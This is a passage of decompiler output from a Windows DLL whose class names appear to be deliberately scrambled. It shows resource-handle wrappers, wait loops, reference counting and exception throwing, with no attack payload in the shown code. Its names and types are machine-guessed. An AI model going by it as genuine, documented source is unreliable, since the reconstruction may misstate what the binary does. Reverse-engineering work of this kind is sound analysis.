  return sub_10028D2D(this - 2, a2, a3);
}

//----- (10028EF9) --------------------------------------------------------
int __stdcall sub_10028EF9(int a1, int a2, int a3)
{
  _DWORD *v3; // eax
  volatile LONG *v5; // [esp-8h] [ebp-2Ch] BYREF
  size_t v6; // [esp-4h] [ebp-28h]
  volatile LONG **v7; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v9; // [esp+20h] [ebp-4h]

  v9 = 0;
  sub_1002F467(a1);
  v6 = 40;
  *(_DWORD *)a1 = &off_10094A8C;
  Block = operator new(v6);
  LOBYTE(v9) = 2;
  if ( Block )
  {
    v5 = (volatile LONG *)v6;
    v7 = &v5;
    sub_10014512(&v5);
    LOBYTE(v9) = 2;
    v3 = sub_10011AFB(-1, 0x80000000, Block, (int)&a2, 128, -1, (int)v5, (volatile LONG *)v6);
  }
  else
  {
    v3 = 0;
  }
  LOBYTE(v9) = 1;
  sub_10006A72((_DWORD *)(a1 + 8), (int)v3);
  LOBYTE(v9) = 4;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  *(_BYTE *)(a1 + 16) = 1;
  v9 = -1;
  sub_1000CE59(&a2);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094A8C: using guessed type int (__thiscall *off_10094A8C)(void *Block, char);

//----- (10028F97) --------------------------------------------------------
_BYTE *__thiscall sub_10028F97(_BYTE *Block, char a2)
{
  sub_10029024(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028FB6) --------------------------------------------------------
int __stdcall sub_10028FB6(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  sub_1002F467(a1);
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_10094A8C;
  *(_DWORD *)(a1 + 12) = v3;
  *(_DWORD *)(a1 + 8) = v4;
  InterlockedIncrement(v3);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 12))(*(_DWORD *)(a1 + 8)) )
  {
    *(_BYTE *)(a1 + 16) = 0;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_BYTE *)(a1 + 16) = 1;
  }
  sub_10003B09(&a2);
  return a1;
}
// 10094A8C: using guessed type int (__thiscall *off_10094A8C)(void *Block, char);

//----- (10029024) --------------------------------------------------------
void __thiscall sub_10029024(_BYTE *this)
{
  *(_DWORD *)this = &off_10094A8C;
  sub_100290E1(this);
  sub_10003B09(this + 8);
  sub_1002F4B5(this);
}
// 10094A8C: using guessed type int (__thiscall *off_10094A8C)(void *Block, char);

//----- (1002907C) --------------------------------------------------------
int __thiscall sub_1002907C(_DWORD **this, _BYTE *a2)
{
  __int16 v2; // ax

  v2 = (*(int (__thiscall **)(_DWORD *))(*this[2] + 52))(this[2]);
  if ( v2 == -1 )
    return 0;
  *a2 = v2;
  return 1;
}

//----- (1002909F) --------------------------------------------------------
int __thiscall sub_1002909F(_DWORD **this, int a2)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(_DWORD *, int))(*this[2] + 48))(this[2], a2);
  return v2 != -1 ? v2 : 0;
}

//----- (100290BA) --------------------------------------------------------
int __thiscall sub_100290BA(_DWORD **this)
{
  int v2; // edi

  v2 = (*(int (__thiscall **)(_DWORD *))(*this[2] + 112))(this[2]);
  return v2 - ((int (__thiscall *)(_DWORD **))(*this)[1])(this);
}

//----- (100290D6) --------------------------------------------------------
BOOL __thiscall sub_100290D6(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) == 0;
}

//----- (100290E1) --------------------------------------------------------
int __thiscall sub_100290E1(_BYTE *this)
{
  int result; // eax
  bool v3; // zf

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
  if ( !(_BYTE)result )
  {
    v3 = this[16] == 0;
    this[4] = 1;
    if ( !v3 )
      return (*(int (__thiscall **)(_DWORD))(**((_DWORD **)this + 2) + 8))(*((_DWORD *)this + 2));
  }
  return result;
}

//----- (10029101) --------------------------------------------------------
int __thiscall sub_10029101(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 68))(this[2]);
}

//----- (10029109) --------------------------------------------------------
int __thiscall sub_10029109(_DWORD **this, int a2, int a3)
{
  int v3; // edx

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = 1;
    }
    else if ( a3 == 2 )
    {
      v3 = 2;
    }
  }
  return (*(int (__thiscall **)(_DWORD *, int, int))(*this[2] + 64))(this[2], a2, v3);
}

//----- (10029133) --------------------------------------------------------
char sub_10029133()
{
  return 1;
}

//----- (10029136) --------------------------------------------------------
_DWORD *__userpurge sub_10029136@<eax>(_DWORD *a1@<esi>, void *a2, char a3, BOOL a4, DWORD a5, int a6)
{
  a1[1] = 0;
  *a1 = off_10093CAC;
  sub_10015027(a1, a2, a3, a4, a5, a6);
  return a1;
}
// 10093CAC: using guessed type int (__thiscall *off_10093CAC[2])(void *Block, char);

//----- (1002915F) --------------------------------------------------------
bool __usercall sub_1002915F@<al>(int a1@<eax>)
{
  return CloseHandle(*(HANDLE *)(a1 + 4));
}

//----- (100291B1) --------------------------------------------------------
bool __usercall sub_100291B1@<al>(int a1@<eax>)
{
  return FreeLibrary(*(HMODULE *)(a1 + 4));
}

//----- (100291DD) --------------------------------------------------------
bool __usercall sub_100291DD@<al>(int a1@<eax>)
{
  return FindCloseUrlCache(*(HANDLE *)(a1 + 4));
}

//----- (10029209) --------------------------------------------------------
bool __usercall sub_10029209@<al>(int a1@<eax>)
{
  return FindClose(*(HANDLE *)(a1 + 4));
}

//----- (10029218) --------------------------------------------------------
_DWORD *__usercall sub_10029218@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  a2[1] = 0;
  *a2 = off_10094AEC;
  sub_100297BF((int)a2, a1);
  return a2;
}
// 10094AEC: using guessed type int (__thiscall *off_10094AEC[3])(void *Block, char);

//----- (1002922C) --------------------------------------------------------
char __thiscall sub_1002922C(void *this, int a2)
{
  sub_1002F9D8(*(HKEY *)(a2 + 4), (int)this);
  return 1;
}

//----- (10029263) --------------------------------------------------------
_DWORD *__usercall sub_10029263@<eax>(int a1@<edi>, _DWORD *a2@<esi>)
{
  a2[1] = 0;
  *a2 = off_10093CE4;
  sub_100297F4((int)a2, a1);
  return a2;
}
// 10093CE4: using guessed type int (__thiscall *off_10093CE4[5])(void *Block, char);

//----- (10029277) --------------------------------------------------------
char __thiscall sub_10029277(HDC *this)
{
  HWND v2; // eax

  v2 = WindowFromDC(this[1]);
  ReleaseDC(v2, this[1]);
  return 1;
}

//----- (100292B6) --------------------------------------------------------
_DWORD *__usercall sub_100292B6@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_10093CE8;
  sub_1001569F((int)a1, 0);
  return a1;
}
// 10093CE8: using guessed type int (__thiscall *off_10093CE8[4])(void *Block, char);

//----- (100292CE) --------------------------------------------------------
char __stdcall sub_100292CE(int a1)
{
  DeleteDC(*(HDC *)(a1 + 4));
  return 1;
}

//----- (10029306) --------------------------------------------------------
_DWORD *__usercall sub_10029306@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_10093CEC;
  sub_10015705((int)a1, 0);
  return a1;
}
// 10093CEC: using guessed type int (__thiscall *off_10093CEC[3])(void *Block, char);

//----- (1002931E) --------------------------------------------------------
char __stdcall sub_1002931E(int a1)
{
  DeleteObject(*(HGDIOBJ *)(a1 + 4));
  return 1;
}

//----- (10029356) --------------------------------------------------------
_DWORD *__usercall sub_10029356@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = off_10094AF0;
  sub_1002985A((int)a1, 0);
  return a1;
}
// 10094AF0: using guessed type int (__thiscall *off_10094AF0[2])(void *Block, char);

//----- (1002936E) --------------------------------------------------------
bool __usercall sub_1002936E@<al>(int a1@<eax>)
{
  return UnmapViewOfFile(*(LPCVOID *)(a1 + 4));
}

//----- (1002937D) --------------------------------------------------------
_DWORD *__usercall sub_1002937D@<eax>(_DWORD *a1@<esi>)
{
  a1[1] = 0;
  *a1 = &off_100946C8;
  sub_10021C8C((int)a1, 0);
  return a1;
}
// 100946C8: using guessed type int (__thiscall *off_100946C8)(void *Block, char);

//----- (10029395) --------------------------------------------------------
bool __usercall sub_10029395@<al>(int a1@<eax>)
{
  return LocalFree(*(HLOCAL *)(a1 + 4)) == 0;
}

//----- (100293A5) --------------------------------------------------------
void __cdecl sub_100293A5(HANDLE hSourceHandle, BOOL bInheritHandle, DWORD dwProcessId)
{
  HANDLE v3; // eax
  HANDLE pExceptionObject[5]; // [esp+10h] [ebp-38h] BYREF
  DWORD v5; // [esp+2Ch] [ebp-1Ch]
  DWORD CurrentProcessId; // [esp+30h] [ebp-18h]
  HANDLE TargetHandle; // [esp+34h] [ebp-14h]
  int v8; // [esp+44h] [ebp-4h]

  TargetHandle = (HANDLE)-1;
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  v3 = OpenProcess(0x40u, 0, dwProcessId);
  pExceptionObject[3] = off_10093CAC;
  pExceptionObject[4] = 0;
  sub_10015027(v3, 0, 0, v5, CurrentProcessId);
  v8 = 0;
  sub_100167F9(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 100293F6: conditional instruction was optimized away because %hSourceProcessHandle.4==0
// 10015027: using guessed type _DWORD __stdcall sub_10015027(_DWORD, char, _DWORD, _DWORD, _DWORD);
// 10093CAC: using guessed type int (__thiscall *off_10093CAC[2])(void *Block, char);

//----- (10029482) --------------------------------------------------------
void __noreturn sub_10029482()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10029482: using guessed type void __noreturn sub_10029482();
// 10029482: using guessed type _DWORD pExceptionObject[2];

//----- (1002949F) --------------------------------------------------------
void __noreturn sub_1002949F()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1002949F: using guessed type void __noreturn sub_1002949F();
// 1002949F: using guessed type _DWORD pExceptionObject[2];

//----- (100294BC) --------------------------------------------------------
void __noreturn sub_100294BC()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 100294BC: using guessed type void __noreturn sub_100294BC();
// 100294BC: using guessed type _DWORD pExceptionObject[2];

//----- (10029587) --------------------------------------------------------
_DWORD *__thiscall sub_10029587(_DWORD *Block, char a2)
{
  sub_10029622(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100295A6) --------------------------------------------------------
_DWORD *__thiscall sub_100295A6(_DWORD *Block, char a2)
{
  sub_100296A8(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100295C5) --------------------------------------------------------
_DWORD *__thiscall sub_100295C5(_DWORD *Block, char a2)
{
  sub_1002971B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100295E4) --------------------------------------------------------
_DWORD *__thiscall sub_100295E4(_DWORD *Block, char a2)
{
  sub_1002978E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029603) --------------------------------------------------------
_DWORD *__thiscall sub_10029603(_DWORD *Block, char a2)
{
  sub_10029829(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029622) --------------------------------------------------------
bool __thiscall sub_10029622(_DWORD *this)
{
  *this = off_10094AE0;
  return sub_1002988F((int)this);
}
// 10094AE0: using guessed type int (__thiscall *off_10094AE0[6])(void *Block, char);

//----- (10029653) --------------------------------------------------------
BOOL __usercall sub_10029653@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10029666) --------------------------------------------------------
char __userpurge sub_10029666@<al>(int a1@<eax>, int a2@<edi>, char a3)
{
  int v3; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v3 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_1002988F(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  if ( a3 )
    sub_10029482();
  *(_DWORD *)(v3 + 4) = a2;
  return a1;
}
// 10029482: using guessed type void __noreturn sub_10029482(void);
// 10029666: using guessed type _DWORD pExceptionObject[3];

//----- (100296A8) --------------------------------------------------------
bool __thiscall sub_100296A8(_DWORD *this)
{
  *this = off_10094AE8;
  return sub_100298A9((int)this);
}
// 10094AE8: using guessed type int (__thiscall *off_10094AE8[4])(void *Block, char);

//----- (100296D9) --------------------------------------------------------
char __userpurge sub_100296D9@<al>(int a1@<eax>, int a2@<edi>, char a3)
{
  int v3; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v3 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100298A9(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  if ( a3 )
    sub_1002949F();
  *(_DWORD *)(v3 + 4) = a2;
  return a1;
}
// 1002949F: using guessed type void __noreturn sub_1002949F(void);
// 100296D9: using guessed type _DWORD pExceptionObject[3];

//----- (1002971B) --------------------------------------------------------
bool __thiscall sub_1002971B(_DWORD *this)
{
  *this = off_10094AE4;
  return sub_100298C3((int)this);
}
// 10094AE4: using guessed type int (__thiscall *off_10094AE4[5])(void *Block, char);

//----- (1002974C) --------------------------------------------------------
char __userpurge sub_1002974C@<al>(int a1@<eax>, int a2@<edi>, char a3)
{
  int v3; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v3 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100298C3(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  if ( a3 )
    sub_100294BC();
  *(_DWORD *)(v3 + 4) = a2;
  return a1;
}
// 100294BC: using guessed type void __noreturn sub_100294BC(void);
// 1002974C: using guessed type _DWORD pExceptionObject[3];

//----- (1002978E) --------------------------------------------------------
char __thiscall sub_1002978E(_DWORD *this)
{
  *this = off_10094AEC;
  return sub_100298DD((int)this);
}
// 10094AEC: using guessed type int (__thiscall *off_10094AEC[3])(void *Block, char);

//----- (100297BF) --------------------------------------------------------
char __usercall sub_100297BF@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100298DD(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 100297BF: using guessed type _DWORD pExceptionObject[3];

//----- (100297F4) --------------------------------------------------------
char __usercall sub_100297F4@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_10015797(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 100297F4: using guessed type _DWORD pExceptionObject[3];

//----- (10029829) --------------------------------------------------------
bool __thiscall sub_10029829(_DWORD *this)
{
  *this = off_10094AF0;
  return sub_100298F6((int)this);
}
// 10094AF0: using guessed type int (__thiscall *off_10094AF0[2])(void *Block, char);

//----- (1002985A) --------------------------------------------------------
char __usercall sub_1002985A@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_100298F6(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 1002985A: using guessed type _DWORD pExceptionObject[3];

//----- (1002988F) --------------------------------------------------------
bool __usercall sub_1002988F@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_10029653(a1) )
    return 1;
  result = sub_100291B1(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100298A9) --------------------------------------------------------
bool __usercall sub_100298A9@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_10029910(a1) )
    return 1;
  result = sub_100291DD(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (100298C3) --------------------------------------------------------
bool __usercall sub_100298C3@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_10029923(a1) )
    return 1;
  result = sub_10029209(a1);
  *(_DWORD *)(a1 + 4) = -1;
  return result;
}

//----- (100298DD) --------------------------------------------------------
char __usercall sub_100298DD@<al>(int a1@<esi>)
{
  void *v1; // ecx
  char result; // al

  if ( !sub_10029936(a1) )
    return 1;
  result = sub_1002922C(v1, a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}
// 100298E9: variable 'v1' is possibly undefined

//----- (100298F6) --------------------------------------------------------
bool __usercall sub_100298F6@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_10029949(a1) )
    return 1;
  result = sub_1002936E(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (10029910) --------------------------------------------------------
BOOL __usercall sub_10029910@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10029923) --------------------------------------------------------
BOOL __usercall sub_10029923@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 != -1 && v1;
}

//----- (10029936) --------------------------------------------------------
BOOL __usercall sub_10029936@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10029949) --------------------------------------------------------
BOOL __usercall sub_10029949@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (1002995C) --------------------------------------------------------
_DWORD *__stdcall sub_1002995C(_DWORD *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  sub_10016441(a1);
  *a1 = &off_10094AF4;
  v1 = operator new(0x24u);
  if ( v1 )
    v2 = sub_10017D60(v1);
  else
    v2 = 0;
  sub_10029A86(a1 + 1, (int)v2);
  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_1001CC48(v3, a1[1], 1);
  else
    v4 = 0;
  sub_10029AF6(a1 + 3, (int)v4);
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094AF4: using guessed type int (__thiscall *off_10094AF4)(void *Block, char);

//----- (100299E7) --------------------------------------------------------
_DWORD *__thiscall sub_100299E7(_DWORD *Block, char a2)
{
  sub_10029A06(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029A06) --------------------------------------------------------
void __thiscall sub_10029A06(_DWORD *this)
{
  *this = &off_10094AF4;
  sub_10029B35(this + 3);
  sub_10029AC5(this + 1);
  sub_1001646C(this);
}
// 10094AF4: using guessed type int (__thiscall *off_10094AF4)(void *Block, char);

//----- (10029A4D) --------------------------------------------------------
int __userpurge sub_10029A4D@<eax>(int a1@<esi>, int a2)
{
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 12) + 20))(*(_DWORD *)(a1 + 12));
  (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a1 + 4) + 36))(*(_DWORD *)(a1 + 4), a2);
  return a2;
}

//----- (10029A86) --------------------------------------------------------
_DWORD *__userpurge sub_10029A86@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10029AC5) --------------------------------------------------------
void __thiscall sub_10029AC5(void *this)
{
  sub_10029B66((int)this);
}

//----- (10029AF6) --------------------------------------------------------
_DWORD *__userpurge sub_10029AF6@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10029B35) --------------------------------------------------------
void __thiscall sub_10029B35(void *this)
{
  sub_10029B8E((int)this);
}

//----- (10029B66) --------------------------------------------------------
void __usercall sub_10029B66(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10029B8E) --------------------------------------------------------
void __usercall sub_10029B8E(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10029BB6) --------------------------------------------------------
_DWORD *__stdcall sub_10029BB6(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_10094B00;
  return a1;
}
// 10094B00: using guessed type int (__thiscall *off_10094B00)(void *Block, char);

//----- (10029BE4) --------------------------------------------------------
_DWORD *__thiscall sub_10029BE4(_DWORD *Block, char a2)
{
  sub_10029C03(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029C03) --------------------------------------------------------
void __thiscall sub_10029C03(_DWORD *this)
{
  *this = &off_10094B00;
  sub_1001646C(this);
}
// 10094B00: using guessed type int (__thiscall *off_10094B00)(void *Block, char);

//----- (10029C27) --------------------------------------------------------
_DWORD *__stdcall sub_10029C27(_DWORD *a1)
{
  *a1 = off_10094AFC;
  `eh vector constructor iterator'(
    a1 + 1,
    8u,
    64,
    (void (__thiscall *)(void *))sub_10029CA6,
    (void (__thiscall *)(void *))sub_10014DFB);
  a1[129] = 0;
  a1[194] = 0;
  memset(a1 + 130, 0, 0x100u);
  return a1;
}
// 1004CC32: using guessed type void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *));
// 10094AFC: using guessed type int (__thiscall *off_10094AFC[2])(void *Block, char);

//----- (10029C87) --------------------------------------------------------
_DWORD *__thiscall sub_10029C87(_DWORD *Block, char a2)
{
  sub_10029CB1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029CA6) --------------------------------------------------------
_DWORD *__thiscall sub_10029CA6(_DWORD *this)
{
  return sub_10014DA7(this, (void *)0xFFFFFFFF, 0);
}

//----- (10029CB1) --------------------------------------------------------
void __thiscall sub_10029CB1(_DWORD *this)
{
  *this = off_10094AFC;
  `eh vector destructor iterator'(this + 1, 8u, 64, (void (__thiscall *)(void *))sub_10014DFB);
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));
// 10094AFC: using guessed type int (__thiscall *off_10094AFC[2])(void *Block, char);

//----- (10029CE2) --------------------------------------------------------
DWORD __cdecl sub_10029CE2(HANDLE a1, DWORD a2)
{
  return sub_10029CF5(&a1, a2);
}

//----- (10029CF5) --------------------------------------------------------
DWORD __cdecl sub_10029CF5(HANDLE *lpHandles, DWORD a2)
{
  int v2; // eax
  DWORD result; // eax
  DWORD v4[2]; // [esp+4h] [ebp-8h] BYREF

  sub_1001C74E(v4, a2);
  while ( 1 )
  {
    v2 = sub_1001C765(v4);
    result = WaitForMultipleObjectsEx(1u, lpHandles, 1, v2, 1);
    if ( result != 192 )
      break;
    if ( sub_1001C786(v4) )
      return 258;
  }
  return result;
}
// 10029CF5: using guessed type DWORD var_8[2];

//----- (10029D3F) --------------------------------------------------------
int __usercall sub_10029D3F@<eax>(int a1@<eax>, int a2@<esi>)
{
  int *v2; // ebx
  int v3; // eax
  unsigned int v4; // eax
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = (int *)(a1 + 4);
  v3 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 16);
  if ( v3 == -1 || !v3 || (v4 = *(_DWORD *)(a2 + 776), v4 >= 0x40) || *(_DWORD *)(a2 + 516) )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_10013739(v2, (int *)(a2 + 8 * v4 + 8));
  result = *(_DWORD *)(*v2 + 16);
  *(_DWORD *)(a2 + 4 * (*(_DWORD *)(a2 + 776))++ + 520) = result;
  return result;
}

//----- (10029EA4) --------------------------------------------------------
_DWORD *__userpurge sub_10029EA4@<eax>(int a1@<edi>, _DWORD *a2, DWORD a3, char pExceptionObject)
{
  int v5; // eax
  DWORD v6; // esi
  DWORD v7; // eax
  _ThrowInfo *v8; // [esp-4h] [ebp-30h]
  int v9; // [esp+10h] [ebp-1Ch] BYREF
  DWORD v10[2]; // [esp+14h] [ebp-18h] BYREF
  int v11; // [esp+1Ch] [ebp-10h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  if ( *(_DWORD *)(a1 + 776) )
  {
    sub_1001C74E(v10, a3);
    while ( 1 )
    {
      InterlockedIncrement((volatile LONG *)(a1 + 516));
      v5 = sub_1001C765(v10);
      v6 = WaitForMultipleObjectsEx(*(_DWORD *)(a1 + 776), (const HANDLE *)(a1 + 520), 1, v5, 1);
      InterlockedDecrement((volatile LONG *)(a1 + 516));
      if ( v6 == 258 )
      {
LABEL_12:
        sub_10014DA7(a2, (void *)0xFFFFFFFF, 0);
        goto LABEL_13;
      }
      v7 = *(_DWORD *)(a1 + 776);
      if ( v6 <= v7 )
        break;
      if ( v6 >= 0x80 && v6 <= v7 + 128 )
      {
        sub_1002A2DB(&pExceptionObject);
        v8 = (_ThrowInfo *)&_TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__;
        goto LABEL_16;
      }
      if ( v6 != 192 )
      {
        sub_100167F9(&v9, 1);
        _CxxThrowException(&v9, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
      }
      if ( pExceptionObject )
      {
        sub_10029BB6(&pExceptionObject);
        v8 = (_ThrowInfo *)&_TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__;
LABEL_16:
        _CxxThrowException(&pExceptionObject, v8);
      }
      if ( sub_1001C786(v10) )
        goto LABEL_12;
    }
    sub_1000ED19(a2, a1 + 8 * v6 + 4);
LABEL_13:
    v12 = 0;
    v11 = 1;
  }
  else
  {
    sub_10014DA7(a2, (void *)0xFFFFFFFF, 0);
    v12 = 0;
    v11 = 1;
  }
  return a2;
}
// 10097504: using guessed type __TI_flags _TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__;
// 10029EA4: using guessed type DWORD var_18[2];

//----- (1002A06A) --------------------------------------------------------
void __thiscall sub_1002A06A(_DWORD *this)
{
  *this = &off_10093CFC;
  sub_1001646C(this);
}
// 10093CFC: using guessed type int (__thiscall *off_10093CFC)(void *Block, char);

//----- (1002A08E) --------------------------------------------------------
void __thiscall sub_1002A08E(_DWORD *this)
{
  *this = &off_10094B08;
  sub_1001646C(this);
}
// 10094B08: using guessed type int (__thiscall *off_10094B08)(void *Block, char);

//----- (1002A0B2) --------------------------------------------------------
_DWORD *__thiscall sub_1002A0B2(_DWORD *Block, char a2)
{
  sub_1002A08E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002A0D1) --------------------------------------------------------
void __thiscall sub_1002A0D1(_DWORD *this)
{
  *this = &off_10094B10;
